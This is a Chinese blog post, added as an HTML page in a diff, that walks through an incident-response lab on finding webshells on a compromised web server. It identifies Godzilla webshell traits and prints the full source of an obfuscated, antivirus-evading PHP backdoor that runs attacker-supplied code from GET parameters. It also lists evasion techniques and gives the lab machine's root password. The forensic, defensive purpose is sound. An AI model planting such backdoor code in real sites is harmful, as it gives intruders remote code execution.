@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - 玄机-webshell查杀</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>玄机-webshell查杀</h1>
+    <p>
+        <span class="meta">发布于: 2024-11-18 06:47</span>
+    </p>
+    <div class="post-body">
+        <p>靶机账号密码 root xjwebshell</p>
+<ul>
+<li>1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</li>
+<li>2.黑客使用的什么工具的shell github地址的md5 flag{md5}</li>
+<li>3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx</li>
+<li>4.黑客免杀马完整路径 md5 flag{md5}</li>
+</ul>
+<p>可以使用xftp，xshell这些成熟工具连接靶机，操作方便</p>
+<p>命令行ssh连接靶机，tar命令打包网站目录，scp命令把网站源码下载到本地</p>
+<pre><code class="language-bash">ssh root@ip
+# yes,输入密码，默认输入不显示
+cd /var/www/html
+tar -czvf www.tar.gz -C /var/www/html .</code></pre>
+<p>windows本地下载靶机里打包好的源码，解压，使用D盾扫描一下，重点关注这些webshell</p>
+<pre><code class="language-bash">scp root@161.189.226.230:/var/www/html/www.tar.gz .</code></pre>
+<p>D盾扫一下，重点关注这些webshell，在include/gz.php中找到flag格式字符串</p>
+<p><img src="/images/xj-webshell/1.png" alt="1" /></p>
+<p><img src="/images/xj-webshell/2.png" alt="2" /></p>
+<p>也可以使用<code>grep</code>命令通过<code>-E</code>参数正则匹配webshell里的flag，太香了。想学linux三剑客！</p>
+<pre><code class="language-bash">cat *.php | grep -o -E ".{1,5}-.{1,4}-.{1,4}-.{1,5}"
+cat */*.php | grep -o -E ".{1,5}-.{1,4}-.{1,4}-.{1,4}-.{1,5}"</code></pre>
+<p>关于黑客使用的什么webshell工具</p>
+<p>跟踪D盾扫描的记录，在<code>gz.php</code>,<code>include/Db/.Mysqli.php</code>都出现了<code>getBasicsInfo</code>，这也算是是<code>哥斯拉</code>的一个典型特征吧</p>
+<p><img src="/images/xj-webshell/4.png" alt="4" /></p>
+<p>以及文件开头的隐藏行为</p>
+<pre><code class="language-php">@session_start(); - 开启一个会话。
+@set_time_limit(0); - 设置脚本执行时间为无限。
+@error_reporting(0); - 关闭所有错误报告。</code></pre>
+<p><a href="https://github.com/BeichenDream/Godzilla">哥斯拉项目地址</a></p>
+<pre><code class="language-bash">php -a
+echo md5('https://github.com/BeichenDream/Godzilla');</code></pre>
+<p>关于隐藏shell的完整路径的md5，在linux里，文件名以<code>.</code>开头是隐藏文件，那么这个隐藏shell还是<code>include/Db/.Mysqli.php</code>，完整路径就是<code>/var/www/html/include/Db/.Mysqli.php</code></p>
+<pre><code class="language-bash">php -a
+echo md5('/var/www/html/include/Db/.Mysqli.php');</code></pre>
+<p>最后，哪个是免杀马？免杀是什么？</p>
+<blockquote>
+<p>免杀：免杀（也叫 绕过杀软 或 绕过检测）是指恶意软件、木马、病毒或攻击代码通过某些技术手段避免被常见的安全防护软件（如杀毒软件、入侵检测系统、入侵防御系统、Web应用防火墙等）检测到或阻止。</p>
+</blockquote>
+<p>一些常见手段：</p>
+<ul>
+<li>代码加密和混淆</li>
+<li>动态加载或执行</li>
+<li>特征伪装</li>
+<li>错误抑制和日志隐藏</li>
+<li>自我修改和变异</li>
+</ul>
+<p>在<code>include/wap/top.php</code>的源码中，存在动态构造后门和编码的过程，可以认为是免杀马</p>
+<p><img src="/images/xj-webshell/5.png" alt="5" /></p>
+<pre><code class="language-php">&lt;?php
+$key = "password";
+//ERsDHgEUC1hI
+$fun = base64_decode($_GET['func']);
+for($i=0;$i&lt;strlen($fun);$i++){
+    $fun[$i] = $fun[$i]^$key[$i+1&amp;7];
+}
+$a = "a";
+$s = "s";
+$c=$a.$s.$_GET["func2"];
+$c($fun);</code></pre>
+<p>参考：</p>
+<ul>
+<li><a href="https://baozongwi.xyz/2024/10/24/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/">玄机第一章 应急响应-webshell查杀</a></li>
+<li><a href="https://blog.csdn.net/administratorlws/article/details/139521078">玄机——第一章 应急响应-webshell查杀 wp（手把手保姆级教学）</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#玄机</span>
+                                    <span>#wp</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
